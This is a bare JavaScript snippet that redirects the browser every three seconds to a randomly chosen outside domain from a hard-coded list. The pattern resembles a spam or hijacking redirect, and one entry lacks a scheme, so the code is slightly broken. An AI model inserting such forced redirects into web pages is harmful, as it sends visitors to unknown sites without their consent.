<script type="text/javascript">

var urls = new Array("beruq.com", "http://echanime.com");

function redirect()
{
window.location = urls[Math.floor(urls.length*Math.random())];
}

var temp = setInterval("redirect()", 3000);

</script>
